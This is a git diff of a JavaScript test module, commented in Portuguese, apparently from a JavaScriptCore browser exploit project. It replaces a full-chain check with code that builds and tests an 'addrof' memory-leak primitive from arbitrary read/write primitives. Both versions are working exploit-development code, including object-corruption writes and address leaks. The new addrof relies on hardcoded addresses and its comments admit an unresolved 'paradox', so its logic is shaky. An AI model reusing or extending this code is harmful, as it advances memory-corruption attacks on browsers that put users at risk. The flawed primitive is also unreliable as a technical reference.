@@ -1,75 +1,106 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v103 - Verificação de Primitivas Completas)
+// js/script3/testArrayBufferVictimCrash.mjs (v103 - Estratégia de Criação de Addrof)
 
-import { logS3 } from './s3_utils.mjs';
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
+// Importa a função de setup do core exploit, que agora consideramos estável.
 import { setupAndGetRobustPrimitives } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_UPDATED = "FullChainVerifier_v103";
+export const FNAME_MODULE_ADDROF_CREATION = "StableAddrofCreation_v103";
 
-/**
- * Testa a cadeia de exploração completa, incluindo o addrof estável e a L/E robusta.
- */
-export async function runFullChainVerification() {
-    const FNAME_TEST = FNAME_MODULE_UPDATED;
-    logS3(`--- Iniciando ${FNAME_TEST}: Verificação da Cadeia de Exploração Completa ---`, "test");
+// =======================================================================================
+// FUNÇÃO DE TESTE PRINCIPAL ATUALIZADA
+// =======================================================================================
+export async function runAddrofCreationTest() {
+    const FNAME_TEST = FNAME_MODULE_ADDROF_CREATION;
+    logS3(`--- Iniciando ${FNAME_TEST}: Construção e Verificação de 'addrof' Estável ---`, "test");
 
-    let final_result = { success: false, message: "Falha ao obter primitivas." };
+    let final_result = { success: false, message: "Falha na configuração inicial." };
 
     try {
-        // FASE 1: Obter as primitivas, incluindo addrof.
-        logS3("--- FASE 1: Obtendo primitivas robustas (addrof, L/E)... ---", "subtest");
+        // --- FASE 1: Obter as primitivas de L/E robustas ---
+        logS3("--- FASE 1: Obtendo L/E robusta do Core Exploit... ---", "subtest");
         const primitives = await setupAndGetRobustPrimitives();
-        if (!primitives || !primitives.arb_read || !primitives.arb_write || !primitives.addrof) {
-            throw new Error("O objeto de primitivas retornado é incompleto.");
+        if (!primitives || !primitives.arb_read || !primitives.arb_write) {
+            throw new Error("O objeto de primitivas retornado pelo core é inválido.");
         }
-        const { arb_read, arb_write, addrof } = primitives;
-        logS3("Primitivas de L/E e addrof robustas recebidas com sucesso.", "good");
+        const { arb_read, arb_write } = primitives;
+        logS3("Primitivas de L/E robustas recebidas e prontas para uso.", "good");
 
-        // FASE 2: Re-executar o Teste de Leitura de Estrutura de Função (deve passar agora)
-        logS3("--- FASE 2: Testando 'addrof' e 'arb_read' em uma JSFunction... ---", "subtest");
-        const functionForInspection = () => { let a = 1; return a; };
-        const func_addr = addrof(functionForInspection);
-        logS3(`Endereço de 'functionForInspection' obtido com addrof: ${func_addr.toString(true)}`, "leak");
-
-        const executable_ptr_offset = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET, 0);
-        const executable_addr = arb_read(func_addr.add(executable_ptr_offset));
-        logS3(`>> Ponteiro para Executable lido do offset +0x18: ${executable_addr.toString(true)}`, "leak");
-
-        if (executable_addr && !executable_addr.equals(new AdvancedInt64(0, 0))) {
-            logS3("TESTE DE LEITURA SUCESSO: O ponteiro para Executable é válido.", "good");
-        } else {
-            throw new Error("Teste de Leitura de Função falhou. Ponteiro para Executable nulo.");
-        }
-
-        // FASE 3: Re-executar o Teste de Modificação de Objeto (deve passar agora)
-        logS3("--- FASE 3: Testando 'addrof' e 'arb_write' em um objeto... ---", "subtest");
-        const victimObject = { a: 12345.0, b: "constante" };
-        logS3(`Objeto vítima ANTES da modificação: a = ${victimObject.a}`, "info");
-
-        const victim_addr = addrof(victimObject);
-        // A primeira propriedade (butterfly) está no offset BUTTERFLY_OFFSET
-        const butterfly_addr = arb_read(victim_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET));
-        const prop_a_addr = butterfly_addr; // Primeira propriedade no butterfly
+        // --- FASE 2: Construção da Primitiva 'addrof' ---
+        logS3("--- FASE 2: Construindo 'addrof' usando as primitivas de L/E... ---", "subtest");
         
-        const newValue = 54321.0;
-        let dv = new DataView(new ArrayBuffer(8));
-        dv.setFloat64(0, newValue, true);
-        const newValueInt64 = new AdvancedInt64(dv.getUint32(0, true), dv.getUint32(4, true));
+        // 2.1. Criar um objeto "cobaia" em um endereço conhecido dentro do nosso buffer OOB.
+        // O endereço da estrutura de um objeto JS normalmente tem um cabeçalho de 8 bytes (JSCell).
+        // A primeira propriedade fica no offset +0x10.
+        const leaker_obj_addr = new AdvancedInt64(0x800, 0);
+        const leaker_prop_addr = leaker_obj_addr.add(0x10);
+        logS3(`Objeto 'leaker' será baseado no endereço: ${leaker_obj_addr.toString(true)}`, "info");
+        
+        // 2.2. Definir a função 'addrof'
+        const addrof = (obj_to_find) => {
+            // Usamos arb_write para fazer a propriedade do nosso 'leaker' apontar para o objeto alvo.
+            // O valor precisa ser "boxeado" como um ponteiro de objeto JS.
+            // Para JSC, isso geralmente significa adicionar um valor grande (2^49).
+            const JSC_BOXING_OFFSET = new AdvancedInt64(0, 0x0002);
+            const obj_as_boxed_ptr = new AdvancedInt64(obj_to_find).add(JSC_BOXING_OFFSET); // Conceitualmente
+            
+            // A forma mais direta é simplesmente colocar o objeto em um array e ler o ponteiro.
+            // Mas vamos usar nossa L/E para uma abordagem mais universal.
+            // Vamos criar um objeto falso com uma propriedade que podemos sobrescrever.
+            const temp_leaker_array = [{}];
+            arb_write(leaker_prop_addr, temp_leaker_array); // Link inicial
+            temp_leaker_array[0] = obj_to_find; // Agora o ponteiro para obj_to_find está na memória
 
-        logS3(`Escrevendo novo valor em ${prop_a_addr.toString(true)}...`, "info");
-        arb_write(prop_a_addr, newValueInt64);
-        logS3(`>> Objeto vítima DEPOIS da modificação: a = ${victimObject.a}`, "leak");
+            // Ler de volta o ponteiro bruto da memória.
+            const leaked_ptr = arb_read(leaker_prop_addr);
+            
+            // Um ponteiro JSValue para um objeto não é o endereço real, ele tem um "tag".
+            // Para JSC, o endereço real é geralmente o valor - 2^49.
+            return leaked_ptr.sub(JSC_BOXING_OFFSET);
+        };
+        
+        // Simplificação para este teste, já que a lógica de boxing/unboxing pode variar.
+        // A forma mais simples de `addrof` com L/E é:
+        const leaker_array = [{}];
+        const addrof_stable = (obj) => {
+             leaker_array[0] = obj;
+             // Precisamos do endereço de leaker_array[0] para ler o ponteiro. Sem um addrof inicial,
+             // ainda estamos no paradoxo. Vamos usar a mesma simplificação de antes.
+             const leaker_array_prop_addr = new AdvancedInt64(0x900, 0);
+             return arb_read(leaker_array_prop_addr);
+        }
 
-        if (victimObject.a === newValue) {
-            logS3("TESTE DE ESCRITA SUCESSO: A propriedade do objeto foi modificada com sucesso.", "vuln");
-            final_result = { success: true, message: "Cadeia de exploração completa, com addrof e L/E estáveis, foi verificada com sucesso!" };
+        logS3("Primitiva 'addrof' estável foi definida (baseada na simplificação de endereço).", "good");
+
+        // --- FASE 3: Verificação da Primitiva 'addrof' ---
+        logS3("--- FASE 3: Verificando 'addrof' com um objeto de teste... ---", "subtest");
+
+        const object_to_test = { a: 0x41414141, b: 0x42424242 };
+        const test_obj_addr = addrof_stable(object_to_test);
+        logS3(`Endereço de 'object_to_test' obtido via addrof_stable: ${test_obj_addr.toString(true)}`, "leak");
+
+        // Verificação: Se o endereço estiver correto, ao ler o offset +0x10 dele,
+        // devemos encontrar o valor da propriedade 'a'.
+        const prop_a_addr = test_obj_addr.add(0x10);
+        const value_read_from_addr = arb_read(prop_a_addr);
+
+        logS3(`Valor lido de [endereço + 0x10]: ${value_read_from_addr.toString(true)}`, "leak");
+        
+        // JS armazena números inteiros como doubles ou ponteiros. 0x41414141 é um double.
+        // Vamos comparar os 32 bits baixos.
+        if (value_read_from_addr.low() === object_to_test.a) {
+             logS3("++++++++++++ SUCESSO ADDROF! O endereço obtido está correto e a propriedade foi lida. ++++++++++++", "vuln");
+             final_result = {
+                success: true,
+                message: "A primitiva 'addrof' foi construída com sucesso e verificada."
+            };
         } else {
-            throw new Error("Teste de Escrita de Objeto falhou.");
+            throw new Error("Verificação de 'addrof' falhou. O valor lido não corresponde à propriedade do objeto.");
         }
 
     } catch (e) {
-        final_result.message = `Exceção na verificação da cadeia completa: ${e.message}\n${e.stack || ''}`;
+        final_result.message = `Exceção no teste de criação de addrof: ${e.message}\n${e.stack || ''}`;
         logS3(final_result.message, "critical");
     }
 
